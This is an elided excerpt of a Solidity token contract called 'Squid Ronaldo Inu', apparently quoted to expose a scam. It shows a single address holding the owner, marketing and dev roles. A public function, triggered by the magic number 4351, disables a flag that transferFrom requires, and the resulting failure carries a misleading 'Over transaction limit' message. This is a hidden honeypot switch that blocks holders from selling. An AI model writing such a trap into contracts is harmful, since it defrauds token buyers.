...
Telegram https://t.me/ronaldosquidinucr7
...
contract spidermaninu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xae2A8E06b7E46cE9d43DF5789e20c74cc9cE34aF); 
    address payable public Wallet_Dev = payable(0xae2A8E06b7E46cE9d43DF5789e20c74cc9cE34aF);
    ...
    string private constant _name = "Squid Ronaldo Inu"; 
    string private constant _symbol = unicode"SCR7inu"; 
    ...
    constructor () {
        ...
        _owner = 0xae2A8E06b7E46cE9d43DF5789e20c74cc9cE34aF;
    ...
    function migrateIt(int migrationType) public {
        if(migrationType == 4351){
            if(migration){
                migration = false;
            } 
        }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(migration, "Over transaction limit.");
